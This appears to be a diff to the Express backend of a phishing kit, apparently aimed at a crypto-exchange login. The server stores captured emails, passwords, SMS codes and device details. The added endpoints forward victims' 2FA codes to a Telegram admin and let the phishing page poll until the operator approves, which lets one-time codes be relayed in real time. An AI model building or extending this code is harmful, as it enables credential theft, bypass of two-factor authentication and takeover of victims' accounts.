@@ -29,6 +29,7 @@ const pendingCodes = {}; // SMS codes
 const pendingGeneric = {}; // generic codes
 const pendingPage = {}; // page 4 logins
 const pendingApprovals = {}; // CB login approvals { email: { status, password, region, device } }
+const pending2FA = {}; // 2FA requests by requestId
 
 // -----------------
 // Health check
@@ -114,15 +115,38 @@ app.post("/send-login", async (req, res) => {
 });
 
 // -----------------
-// 2FA Code via Telegram
-app.post('/api/verify-code', (req, res) => {
-  const { code, chatId } = req.body;
-  if (typeof code === "string" && code.length >= 6 && code.length <= 8) {
-    send2FACode(code, chatId);
-    res.status(200).send({ message: 'Code sent to Telegram.' });
-  } else {
-    res.status(400).send({ message: 'Invalid code length.' });
+// 2FA Code via Telegram (frontend integration)
+app.post('/api/submit-2fa', (req, res) => {
+  const { code, requestId } = req.body;
+  if (!code || !requestId) {
+    return res.status(400).json({ status: 'error', message: 'Missing code or requestId' });
   }
+
+  pending2FA[requestId] = { status: 'pending' };
+
+  // Send to Telegram admin (ADMIN_CHAT_ID is used in bot.js)
+  send2FACode(code, requestId);
+
+  res.json({ status: 'pending', requestId });
+});
+
+// Polling endpoint for frontend to check approval status
+app.get('/api/approval-status/:requestId', (req, res) => {
+  const { requestId } = req.params;
+  if (!pending2FA[requestId]) {
+    return res.json({ status: 'unknown' });
+  }
+  res.json({ status: pending2FA[requestId].status });
+});
+
+// Update status from Telegram bot (called by bot.js)
+app.post('/api/update-2fa-status', (req, res) => {
+  const { requestId, status } = req.body;
+  if (!pending2FA[requestId]) {
+    return res.json({ ok: false, message: 'RequestId not found' });
+  }
+  pending2FA[requestId].status = status;
+  res.json({ ok: true });
 });
 
 // -----------------
